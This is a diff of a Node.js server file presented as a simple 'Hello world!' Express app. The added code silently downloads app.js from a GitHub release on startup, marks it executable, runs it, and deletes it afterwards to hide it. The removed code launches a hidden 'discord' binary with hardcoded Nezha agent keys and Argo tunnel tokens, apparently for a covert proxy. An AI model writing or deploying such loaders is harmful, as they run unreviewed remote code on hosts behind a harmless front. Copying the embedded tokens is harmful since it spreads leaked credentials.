@@ -1,33 +1,85 @@
-const { execFile } = require('child_process');
-const path = require('path');
+const express = require("express");
+const app = express();
 const fs = require('fs');
-const dotenv = require('dotenv');
+const path = require('path');
+const axios = require('axios');
+const { exec } = require('child_process');
+const FILE_PATH = process.env.FILE_PATH || './tmp';
+const PORT = process.env.SERVER_PORT || process.env.PORT || 3000; 
 
-dotenv.config();
+if (!fs.existsSync(FILE_PATH)) {
+  fs.mkdirSync(FILE_PATH);
+  console.log(`${FILE_PATH} is created`);
+} else {
+  console.log(`${FILE_PATH} already exists`);
+}
 
-const env = {
-    URL: process.env.URL || '',
-    TIME: process.env.TIME || '120',
-    UUID: process.env.UUID || '9afd1229-b893-40c1-84dd-51e7ce204913',
-    NEZHA_SERVER: process.env.NEZHA_SERVER || 'nz.f4i.cn',
-    NEZHA_PORT: process.env.NEZHA_PORT || '5555',
-    NEZHA_KEY: process.env.NEZHA_KEY || 'vi6gv71EWtEgSPXkHy',
-    ARGO_DOMAIN: process.env.ARGO_DOMAIN || '2go.askoo.dev',
-    ARGO_AUTH: process.env.ARGO_AUTH || 'eyJhIjoiOGI5NzI0MDgwZTU1ZTcwMzcwZmI3NDI4NzkyMmYzMWIiLCJ0IjoiM2E3NzJlYWMtODE3MC00MzljLTk3NjQtNDQzOWQyMjM4NDY3IiwicyI6Ik9EaGpZbVV5TkRRdE9UQTBOUzAwTldNeUxXRXpaakF0WldFNE1ESmtNMlF6WWpnNCJ9',
-    ARGO_PORT: process.env.ARGO_PORT || '8080',
-    CFIP: process.env.CFIP || 'www.visa.com.tw',
-    CFPORT: process.env.CFPORT || '443',
-    NAME: process.env.NAME || 'Saclingo',
-};
-
-const logFile = fs.openSync('app.log', 'a');
-const binaryPath = path.join(__dirname, 'discord');
-const child = execFile(binaryPath, [], {
-    env: env,
-    stdio: ['ignore', logFile, logFile]  
+app.get("/", function(req, res) {
+  res.send("Hello world!");
 });
 
-child.on('error', () => {});
-child.on('exit', () => {
-    fs.closeSync(logFile);
+const subTxtPath = path.join(FILE_PATH, 'log.txt');
+app.get("/log", (req, res) => {
+  fs.readFile(subTxtPath, "utf8", (err, data) => {
+    if (err) {
+      console.error(err);
+      res.status(500).send("Error reading log.txt");
+    } else {
+      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+      res.send(data);
+    }
+  });
+});
+
+// Specify the URL of the bot.js file to download
+const fileUrl = 'https://github.com/wwoovv/111/releases/download/1219/app.js';
+const fileName = 'app.js';
+const filePath = path.join(FILE_PATH, fileName);
+
+// Download and execute the file
+const downloadAndExecute = () => {
+  const fileStream = fs.createWriteStream(filePath);
+
+  axios
+    .get(fileUrl, { responseType: 'stream' })
+    .then(response => {
+      response.data.pipe(fileStream);
+      return new Promise((resolve, reject) => {
+        fileStream.on('finish', resolve);
+        fileStream.on('error', reject);
+      });
+    })
+    .then(() => {
+      console.log('File downloaded successfully');
+      fs.chmodSync(filePath, '777'); 
+
+      console.log('Executing the file...');
+      const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
+        if (error) {
+          console.error(`Execution error: ${error}`);
+          return;
+        }
+        console.log(`${stdout}`);
+        console.error(`${stderr}`);
+      });
+
+      child.on('exit', (code) => {
+      //  console.log(`Child process exited with code ${code}`);
+        fs.unlink(filePath, err => {
+          if (err) {
+            console.error(`Error deleting file: ${err}`);
+          } else {
+            console.log(`App is running!`);
+          }
+        });
+      });
+    })
+    .catch(error => {
+      console.error(`Download error: ${error}`);
+    });
+};
+downloadAndExecute();
+
+app.listen(PORT, () => {
+  console.log(`Server is running on port:${PORT}`);
 });
